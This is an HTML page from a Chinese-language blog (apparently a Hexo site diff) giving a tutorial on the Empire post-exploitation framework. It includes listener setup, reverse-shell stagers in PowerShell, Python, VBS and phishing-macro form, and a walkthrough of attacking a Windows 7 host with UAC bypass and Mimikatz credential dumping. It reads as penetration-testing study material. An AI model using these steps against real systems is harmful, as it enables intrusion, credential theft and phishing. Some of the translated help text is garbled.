@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>empire | mr-mingy | blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">mr-mingy | blog</a></h1></div><p class="m-desc"> 不忘初心<br>不念过往<br>不畏将来</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" action="/search" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">empire</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2019/04/12/empire/">2019-04-12</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p><strong>Empire详解</strong></p>
+<hr>
+<p><strong>一、empire简介</strong></p>
+<blockquote>
+<p>Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中。</p>
+</blockquote>
+<blockquote>
+<p>关于内网渗透，我们平时基本第一时间想到Metasploit，集信息收集，预渗透，渗透，后渗透，木马，社会工程学于一体的平台，但是Empire就是针对内网的渗透，针对powershell，在内网渗透能用到的powershell脚本，全部集成在Empire框架中，其更是域渗透神器。</p>
+</blockquote>
+<hr>
+<p>二、empire的安装</p>
+<pre><code>git clone https://github.com/EmpireProject/Empire.git
+cd Empire/
+cd setup/
+sudo ./install.sh
+cd Empire/
+cd setup/
+./reset.sh
+</code></pre><hr>
+<p>三、empire简单命令</p>
+<pre><code>cd Empire/
+./empire
+</code></pre><p><img src="/2019/04/12/empire/help.png" alt="help.png"></p>
+<pre><code>(Empire) &gt; help
+
+Commands
+=================
+
+agents          跳转到 &quot;代理&quot; 菜单。
+creds           显示数据库中的凭据。
+exit            退出帝国
+help            显示帮助菜单。
+interact        与特定代理交互。
+list            列出活动代理或侦听器。
+listeners       侦听器与活跃的侦听器交互。
+load            从非标准文件夹加载empire模块。
+plugin          加载一个插件文件来扩展empire。
+plugins         所有可用和活动的插件。
+preobfuscate    预融合 PowerShell 模块源文件
+reload          重新加载一个 (或全部) empire模块。
+report          生成CSV和日志文件报告: session.csv, credentis.csv, master.log
+reset           重置全局选项 (例如 IP 白名单)。
+resource        从文件中读取并执行empire命令的列表。
+searchmodule    模块搜索empire模块名称描述。
+set             设置全局选项 (例如 IP 白名单)。
+show            显示全局选项 (例如 IP 白名单)。
+usemodule       使用empire模块。
+usestager       使用者使用empire的毒刺。
+</code></pre><pre><code>(Empire) &gt; help
+(Empire) &gt; listeners
+(Empire: listeners) &gt; info
+(Empire: listeners) &gt; set Name test
+(Empire: listeners) &gt; execute
+(Empire: listeners) &gt; usestager launcher test
+(Empire: agents) &gt; interact USSZC2P1XCTBKYGH
+(Empire: USSZC2P1XCTBKYGH) &gt; shell dir
+(Empire: USSZC2P1XCTBKYGH) &gt; shell ipconfig
+</code></pre><blockquote>
+<p>代理监听IP地址更改：<br>通过kali下的SQLiteBrowser打开empire下data目录下的数据库empire.db修改监听IP</p>
+</blockquote>
+<hr>
+<p>四、生成反弹shell代理</p>
+<ol>
+<li>powershell反弹shell代理</li>
+</ol>
+<pre><code>(Empire: listeners) &gt; usestager
+(Empire: listeners) &gt; usestager launcher test
+(Empire: stager/launcher) &gt; execute
+
+执行生成后的命令反弹shell成功
+</code></pre><pre><code>(Empire) &gt; listeners
+(Empire: listeners) &gt; uselistener
+(Empire: listeners) &gt; uselistener http
+(Empire: listeners/http) &gt; info
+(Empire: listeners/http) &gt; set Name WIN7
+(Empire: listeners/http) &gt; set Host http://192.168.1.25:8889
+(Empire: listeners/http) &gt; set Port 8889
+(Empire: listeners/http) &gt; execute
+(Empire: listeners/http) &gt; listeners
+(Empire: listeners) &gt; launcher powershell WIN7
+
+执行生成的powershell脚本，empire端显示监听成功
+</code></pre><p><img src="/2019/04/12/empire/1.png" alt="listeners"></p>
+<ol start="2">
+<li>python反弹shell代理</li>
+</ol>
+<pre><code>(Empire: listeners) &gt; launcher python WIN7
+
+执行生成的python脚本，empire端显示监听成功
+</code></pre><ol start="3">
+<li>vbs反弹shell代理</li>
+</ol>
+<pre><code>(Empire: listeners) &gt; usestager windows/launcher_vbs WIN7
+(Empire: stager/windows/launcher_vbs) &gt; info
+(Empire: stager/windows/launcher_vbs) &gt; execute
+
+执行在tmp目录下生成的launcher.vbs，empire端显示监听成功
+</code></pre><ol start="4">
+<li>钓鱼宏代理</li>
+</ol>
+<pre><code>(Empire: listeners) &gt; usestager windows/macro WIN7
+(Empire: stager/windows/macro) &gt; info
+(Empire: stager/windows/macro) &gt; execute
+
+将在tmp目录下生成的macro文件中的代码，复制到创建execl的宏代码中。
+</code></pre><p>五、empire攻击win7过程</p>
+<ol>
+<li>进入listeners</li>
+</ol>
+<p><img src="/2019/04/12/empire/1.png" alt="listeners"></p>
+<ol start="2">
+<li><p>使用并配置http listeners<br><img src="/2019/04/12/empire/2.png" alt="listeners"></p>
+</li>
+<li><p>使用攻击木马<br><img src="/2019/04/12/empire/3.png" alt="listeners"></p>
+</li>
+<li><p>使用并生成vbs类型的攻击木马<br><img src="/2019/04/12/empire/4.png" alt="listeners"></p>
+</li>
+</ol>
+<p><img src="/2019/04/12/empire/5.png" alt="listeners"></p>
+<ol start="5">
+<li><p>在tmp目录下生成launcher.vbs木马<br><img src="/2019/04/12/empire/6.png" alt="listeners"></p>
+</li>
+<li><p>执行木马后，empire端成功返回监听代理<br><img src="/2019/04/12/empire/7.png" alt="listeners"></p>
+</li>
+<li><p>修改代理名字<br><img src="/2019/04/12/empire/8.png" alt="listeners"></p>
+</li>
+<li><p>进入代理并使用bypassuac提权，提权成功生成一个在Username处前有<code>*</code>号的新的代理。<br><img src="/2019/04/12/empire/9.png" alt="listeners"></p>
+</li>
+<li><p>修改提权之后的代理名称，进入代理，使用mimikatz抓取机器密码，creds查看明文和密文密码<br><img src="/2019/04/12/empire/10.png" alt="listeners"></p>
+</li>
+</ol>
+<p><img src="/2019/04/12/empire/11.png" alt="listeners"></p>
+<p><img src="/2019/04/12/empire/12.png" alt="listeners"></p>
+<p><img src="/2019/04/12/empire/13.png" alt="listeners"></p>
+<ol start="10">
+<li><p>sysinfo查看系统信息<br><img src="/2019/04/12/empire/14.png" alt="listeners"></p>
+</li>
+<li><p>upload上传文件、download下载文件、dir查看目录<br><img src="/2019/04/12/empire/15.png" alt="listeners"></p>
+</li>
+</ol>
+<p><img src="/2019/04/12/empire/16.png" alt="listeners"></p>
+<p>六、命令详解</p>
+<ol>
+<li>listeners</li>
+</ol>
+<pre><code>(Empire) &gt; listeners
+(Empire: listeners) &gt; help
+
+Listener Commands
+=================
+
+agents          跳转到代理菜单。
+back            返回到主菜单。
+creds           从数据库返回凭据。
+delete          从数据库中删除删除侦听器
+disable         禁用 (停止) 一个或所有侦听器。听者不会自动从帝国开始
+edit            编辑更改侦听器选项, 在重新启动侦听器之前不会生效
+enable          启用并启动一个或所有列表。
+exit            退出empire。
+help            显示帮助菜单。
+info            显示给定活动侦听器的信息。
+kill            杀死一个或所有活跃的侦听器。
+launcher        为侦听器生成初始启动器。
+list            列出所有活动侦听器 (或代理)。
+listeners       跳转到侦听器菜单。
+main            返回主菜单。
+resource        从文件中读取并执行帝国命令的列表。
+uselistener     使用empire听众模块。
+usestager       使用empire的stager木马。
+</code></pre><p><img src="/2019/04/12/empire/listeners.png" alt="listeners"></p>
+<ol start="2">
+<li>usestarger<br><code>`</code><br>(Empire) &gt;usestager stager/windows/launcher_vbs win71pre<br>(Empire: stager/windows/launcher_vbs) &gt; help</li>
+</ol>
+<p>agents              跳转到代理菜单。<br>back                 返回返回菜单。<br>creds               从数据库返回凭据。<br>execute           执行生成器执行给定的empire支架。<br>exit                 退出empire。<br>generate           执行给定的empire支架。<br>help                 显示帮助菜单。<br>info                 显示统计器选项。<br>interact           与特定代理交互。<br>list                 列出所有活动代理 (或侦听器)。<br>listeners         跳转到侦听器菜单。<br>main                 返回主菜单。<br>options           选项显示统计器选项。<br>resource           从文件中读取并执行empire命令的列表。<br>set                 设置一个稳定器选项。<br>unset               取消设置的统计器选项。</p>
+<pre><code>
+3. interact
+
+</code></pre><p>(Empire) &gt;interact win71pre<br>(Empire: win71pre) &gt; help</p>
+<h1 id="Agent-Commands"><a href="#Agent-Commands" class="headerlink" title="Agent Commands"></a>Agent Commands</h1><p>agents                 跳转到代理菜单。<br>back                   返回菜单。<br>bypassuac           运行bypassuac, 绕过uac，为侦听器生成一个新的高完整性代理。例如: 生成<listener><br>clear                 清除代理任务。<br>creds                 从数据库返回凭据。<br>download             任务代理下载文件。<br>exit                   退出任务代理退出。<br>help                   显示特定命令的帮助菜单或语法。<br>info                   显示有关此代理的信息<br>injectshellcode 将侦听器shellcode注入远程进程。例如: 注射代码&lt;meter_listener&gt; <pid><br>jobs                   返回作业或终止正在运行的作业。<br>kill                   终止任务代理以终止特定的进程名称或 ID。<br>killdate            获取或设置代理的杀人日期 (01.5。<br>list                   列出所有活动代理 (或侦听器)。<br>listeners           跳转到侦听器菜单。<br>lostlimit            代理更改丢失的代理检测的限制<br>main                  返回主菜单。<br>mimikatz             在客户端上运行调用调用。<br>psinject             将启动器注入远程进程。例如, 项目<listener> <pid rocess_name><br>pth                   通过Mimikatz执行CredID的PTH。<br>rename                 重命名重命名代理。<br>resource             从文件中读取并执行empire命令的列表。<br>revtoself           使用凭据令牌来恢复令牌特权。<br>sc                       采用屏幕截图, 默认值为 PNG。给出比率意味着使用 JPEG。例如, sc [1-100]<br>scriptcmd           在当前导入的 PowerShell 脚本中执行一个函数。<br>scriptimport      脚本端口导入 PowerShell 脚本并将其保存在代理的内存中。<br>searchmodule       搜索模块搜索empire模块名称描述。<br>shell                 要使用 shell 命令的代理。<br>shinject             将注入非 meterpreter 侦听器shellcode插入远程进程。例如: shinject <listener> <pid><br>sleep                 休眠任务代理到 “睡眠间隔 [抖动]”<br>spawn                 生成一个新的empire代理为给定的听众名称。例如: 生成<listener><br>steal_token       使用凭据令牌模拟给定进程 ID 的令牌。<br>sysinfo             任务代理以获取系统信息。<br>updatecomms       动态更新代理通信到另一个侦听器<br>updateprofile     更新代理连接配置文件。<br>upload                上载文件。<br>usemodule           使用empire powershell模块。<br>workinghours       获取或设置代理的工作时间 (9:00-17:00).<br><code>`</code><br><img src="/2019/04/12/empire/interact.png" alt="interact"></listener></pid></listener></pid></listener></pid></listener></p>
+<ol start="4">
+<li>agents</li>
+</ol>
+<p><img src="/2019/04/12/empire/agents.png" alt="agents"></p>
+<ol start="5">
+<li>creds</li>
+</ol>
+<p><img src="/2019/04/12/empire/creds.png" alt="creds"></p>
+<ol start="6">
+<li><p>list<br><img src="/2019/04/12/empire/list.png" alt="list"></p>
+</li>
+<li><p>launcher<br><img src="/2019/04/12/empire/launcher.png" alt="launcher"></p>
+</li>
+<li><p>load<br><img src="/2019/04/12/empire/load.png" alt="load"></p>
+</li>
+</ol>
+<ol start="9">
+<li>plugin<br><img src="/2019/04/12/empire/plugin.png" alt="plugin"></li>
+</ol>
+<ol start="10">
+<li><p>plugins<br><img src="/2019/04/12/empire/plugins.png" alt="plugins"></p>
+</li>
+<li><p>reload<br><img src="/2019/04/12/empire/reload.png" alt="reload"></p>
+</li>
+<li><p>report<br><img src="/2019/04/12/empire/report.png" alt="report"></p>
+</li>
+<li><p>reset<br><img src="/2019/04/12/empire/reset.png" alt="reset"></p>
+</li>
+<li><p>searchmodule</p>
+</li>
+</ol>
+<p><img src="/2019/04/12/empire/searchmodule.png" alt="searchmodule"></p>
+<ol start="18">
+<li>set</li>
+</ol>
+<p><img src="/2019/04/12/empire/set.png" alt="set"></p>
+<ol start="20">
+<li>show</li>
+</ol>
+<p><img src="/2019/04/12/empire/show.png" alt="show"></p>
+<ol start="22">
+<li>usemodule</li>
+</ol>
+<p><img src="/2019/04/12/empire/usemodule.png" alt="usemodule"></p>
+<ol start="24">
+<li>usestager</li>
+</ol>
+<p><img src="/2019/04/12/empire/usestager.png" alt="usestager"></p>
+<p>七、Refer</p>
+<blockquote>
+<p><a href="http://www.powershellempire.com/" target="_blank" rel="noopener">PowerShell Empire | Building an Empire with PowerShell</a><br><a href="http://www.powershellempire.com/?page_id=110" target="_blank" rel="noopener">Quick Start | PowerShell Empire</a><br><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">GitHub - EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent.</a><br><a href="https://xz.aliyun.com/t/67" target="_blank" rel="noopener">后渗透测试神器Empire的详解 - 先知社区</a></p>
+</blockquote>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">mr-mingy</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2019/04/12/empire/">http://yoursite.com/2019/04/12/empire/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://yoursite.com">mr-mingy的博客</a>！</span></div></blockquote></div></article><div class="p-info box"></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2019/04/09/openssl-shell/">openssl-shell &gt;</a></div></section><footer><p>Copyright © 2016 - 2019 <a href="/." rel="nofollow">mr-mingy | blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
